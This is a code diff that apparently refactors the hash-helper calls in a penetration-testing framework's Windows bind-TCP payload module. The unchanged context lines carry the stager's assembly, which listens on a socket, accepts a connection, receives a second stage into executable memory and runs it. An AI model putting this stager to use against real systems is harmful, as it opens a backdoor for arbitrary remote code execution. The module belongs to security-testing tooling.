@@ -121,14 +121,14 @@ module Payload::Windows::BindTcp
         push 0x00003233        ; Push the bytes 'ws2_32',0,0 onto the stack.
         push 0x5F327377        ; ...
         push esp               ; Push a pointer to the "ws2_32" string on the stack.
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
+        push #{block_api_hash('kernel32.dll', 'LoadLibraryA')}
         call ebp               ; LoadLibraryA( "ws2_32" )
 
         mov eax, 0x0190        ; EAX = sizeof( struct WSAData )
         sub esp, eax           ; alloc some space for the WSAData structure
         push esp               ; push a pointer to this struct
         push eax               ; push the wVersionRequested parameter
-        push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}
+        push #{block_api_hash('ws2_32.dll', 'WSAStartup')}
         call ebp               ; WSAStartup( 0x0190, &WSAData );
 
         push 11
@@ -144,7 +144,7 @@ module Payload::Windows::BindTcp
                                ; we do not specify a protocol [5]
         push 1                 ; push SOCK_STREAM
         push #{addr_fam}       ; push AF_INET/6
-        push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')}
+        push #{block_api_hash('ws2_32.dll', 'WSASocketA')}
         call ebp               ; WSASocketA( AF_INET/6, SOCK_STREAM, 0, 0, 0, 0 );
         xchg edi, eax          ; save the socket for later, don't care about the value of eax after this
 
@@ -155,7 +155,7 @@ module Payload::Windows::BindTcp
         push #{sockaddr_size}  ; length of the sockaddr_in struct (we only set the first 8 bytes, the rest aren't used)
         push esi               ; pointer to the sockaddr_in struct
         push edi               ; socket
-        push #{Rex::Text.block_api_hash('ws2_32.dll', 'bind')}
+        push #{block_api_hash('ws2_32.dll', 'bind')}
         call ebp               ; bind( s, &sockaddr_in, 16 );
     ^
 
@@ -170,18 +170,18 @@ module Payload::Windows::BindTcp
     asm << %Q^
                                ; backlog, pushed earlier [3]
         push edi               ; socket
-        push #{Rex::Text.block_api_hash('ws2_32.dll', 'listen')}
+        push #{block_api_hash('ws2_32.dll', 'listen')}
         call ebp               ; listen( s, 0 );
 
                                ; we set length for the sockaddr struct to zero, pushed earlier [2]
                                ; we dont set the optional sockaddr param, pushed earlier [1]
         push edi               ; listening socket
-        push #{Rex::Text.block_api_hash('ws2_32.dll', 'accept')}
+        push #{block_api_hash('ws2_32.dll', 'accept')}
         call ebp               ; accept( s, 0, 0 );
 
         push edi               ; push the listening socket
         xchg edi, eax          ; replace the listening socket with the new connected socket for further comms
-        push #{Rex::Text.block_api_hash('ws2_32.dll', 'closesocket')}
+        push #{block_api_hash('ws2_32.dll', 'closesocket')}
         call ebp               ; closesocket( s );
     ^
 
@@ -204,7 +204,7 @@ module Payload::Windows::BindTcp
         push 4                 ; length = sizeof( DWORD );
         push esi               ; the 4 byte buffer on the stack to hold the second stage length
         push edi               ; the saved socket
-        push #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
+        push #{block_api_hash('ws2_32.dll', 'recv')}
         call ebp               ; recv( s, &dwLength, 4, 0 );
     ^
 
@@ -223,7 +223,7 @@ module Payload::Windows::BindTcp
         push 0x1000            ; MEM_COMMIT
         push esi               ; push the newly received second stage length.
         push 0                 ; NULL as we dont care where the allocation is.
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
+        push #{block_api_hash('kernel32.dll', 'VirtualAlloc')}
         call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
         ; Receive the second stage and execute it...
         xchg ebx, eax          ; ebx = our new memory address for the new stage
@@ -233,7 +233,7 @@ module Payload::Windows::BindTcp
         push esi               ; length
         push ebx               ; the current address into our second stage's RWX buffer
         push edi               ; the saved socket
-        push #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
+        push #{block_api_hash('ws2_32.dll', 'recv')}
         call ebp               ; recv( s, buffer, length, 0 );
     ^
 
@@ -261,7 +261,7 @@ module Payload::Windows::BindTcp
       else
         asm << %Q^
       failure:
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'ExitProcess')}
+        push #{block_api_hash('kernel32.dll', 'ExitProcess')}
         call ebp
         ^
       end
